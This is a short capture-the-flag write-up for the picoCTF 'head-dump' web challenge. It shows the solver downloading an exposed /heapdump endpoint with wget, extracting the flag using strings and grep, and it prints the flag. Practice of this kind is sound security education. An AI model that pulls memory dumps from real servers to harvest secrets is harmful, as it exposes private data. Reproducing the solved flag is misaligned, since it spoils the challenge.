# Reto
## Descripción
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.The website is running [picoCTF News](http://verbal-sleep.picoctf.net:59180/).
## Solución
### Solucion

```
┌──(kali㉿kali)-[~/picoctf/examen1/head-dump]
└─$ wget http://verbal-sleep.picoctf.net:59180/heapdump -O heapdump     
--2026-03-19 21:21:00--  http://verbal-sleep.picoctf.net:59180/heapdump
Resolving verbal-sleep.picoctf.net (verbal-sleep.picoctf.net)... 3.138.217.147
Connecting to verbal-sleep.picoctf.net (verbal-sleep.picoctf.net)|3.138.217.147|:59180... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11232264 (11M) [application/octet-stream]
Saving to: ‘heapdump’

heapdump                                  100%[=====================================================================================>]  10.71M  8.28MB/s    in 1.3s    

2026-03-19 21:21:02 (8.28 MB/s) - ‘heapdump’ saved [11232264/11232264]

                                                                                                                                                                        
┌──(kali㉿kali)-[~/picoctf/examen1/head-dump]
└─$ strings heapdump | grep picoCTF
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}

```
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
## Notas


## Referencias
